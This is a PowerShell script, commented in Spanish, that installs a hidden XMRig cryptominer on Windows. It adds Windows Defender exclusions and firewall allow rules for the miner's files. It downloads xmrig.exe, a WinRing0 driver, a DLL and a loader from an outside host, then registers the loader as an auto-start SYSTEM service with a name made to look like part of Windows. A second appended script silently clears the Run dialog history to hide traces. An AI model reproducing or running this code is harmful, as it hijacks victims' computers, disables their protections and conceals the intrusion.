$baseURL = "https://baa4ts.is-a-good.dev"


# Variables
$root = Join-Path $env:WINDIR -ChildPath "events"

# Archivos
$xmrig = (Join-Path -Path $root -ChildPath "xmrig.exe")
$Win2 = (Join-Path -Path $root -ChildPath "Win2Internals.exe")
$wroom = (Join-Path -Path $root -ChildPath "wroom.dll")
$WinRing = (Join-Path -Path $root -ChildPath "WinRing0x64.sys")

# Crear la carpeta si no existe
if (-not (Test-Path -Path $root)) 
{
    New-Item -Path $root -ItemType Directory
}

# Establecer la variable de entorno
setx WINUSERNAME $env:USERNAME /M

# Exclusiones de path
Add-MpPreference -ExclusionPath $root
Add-MpPreference -ExclusionPath $Win2
Add-MpPreference -ExclusionPath $xmrig
Add-MpPreference -ExclusionPath $wroom
Add-MpPreference -ExclusionPath $WinRing

# Exclusiones de procesos
Add-MpPreference -ExclusionProcess "xmrig.exe"
Add-MpPreference -ExclusionProcess "Win2Internals.exe"

# Firewall exclusiones
New-NetFirewallRule -DisplayName "Entrada XMRIG" -Direction Inbound -Program $xmrig -Action Allow -Profile Any
New-NetFirewallRule -DisplayName "Salida XMRIG" -Direction Outbound -Program $Win2 -Action Allow -Profile Any

# Descargar
Start-BitsTransfer -Source "$baseURL/Win2Internals.exe" -Destination $Win2
Start-BitsTransfer -Source "$baseURL/WinRing0x64.sys" -Destination $WinRing
Start-BitsTransfer -Source "$baseURL/wroom.dll" -Destination $wroom
Start-BitsTransfer -Source "$baseURL/xmrig.exe" -Destination $xmrig

# Crear el servicio
sc.exe create Win2Internals binPath= "$Win2" start= auto obj= "LocalSystem" type= own
## sc.exe sdset Win2Internals "D:(A;;GA;;;SY)"

# FILE: Clear-RunHistorySilent.ps1
# Script para limpiar el historial del cuadro Ejecutar (Windows + R) sin salida

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"

Try {
    Remove-ItemProperty -Path $regPath -Name * -ErrorAction SilentlyContinue
} Catch {
    # No hacer nada si hay error
}

